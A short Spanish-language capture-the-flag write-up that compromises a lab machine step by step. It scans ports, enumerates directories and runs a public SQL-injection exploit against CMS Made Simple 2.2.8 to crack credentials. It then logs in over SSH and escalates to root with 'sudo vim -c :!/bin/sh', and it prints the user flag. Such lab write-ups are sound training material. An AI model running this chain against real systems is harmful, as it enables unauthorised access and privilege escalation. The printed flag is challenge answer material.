# Summary
- IP: 10.10.129.26
- Ports: 21,80,2222
- OS: Linux (Ubuntu)
- Services & Applications:
	-  21 -> vsftpd 3.0.3
	-  80 -> Apache httpd 2.4.18
	-  2222 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

# Recon

- Escaneo básico de puertos:

```
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.129.26 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```
$sudo nmap -p21,80,2222 -sCV 10.10.129.26 -oN targeted
```


- Buscamos vulnerabilidades en las aplicaciones encontradas, ftp no nos da nada, la página no contiene nada relevante; hacemos escaneo de directorios con gobuster:

```
$gobuster dir -u http://10.10.129.26/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```


- Encontramos un directorio "simple", lo analizamos y encontramos una app web con su version, buscamos vulnerabilidades para la misma:

```
$searchsploit CMS Made Simple 2.2.8
```


- Encontramos una vulnerabilidad SQLi, exportamos la script de python y la ejecutamos

```
$python2.7 46635.py -u http://10.10.129.26/simple/ --crack -w /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
```


- Obtenemos credenciales e intentamos conectarnos por ssh:

```
ssh mitch@10.10.129.26 -p 2222
```


- Encontramos la user flag:
# USER FLAG: G00d j0b, keep up!

- Buscamos binarios con permisos de sudoers:

```
mitch@machine:/$sudo -l
```


- Vemos que podemos ejecutar como sudoer el binario "vim", el cual buscamos en gtfobins para poder escalar privilegios:
```
sudo vim -c ':!/bin/sh'
```

- Encontramos la root flag:
# ROOT FLAG: 
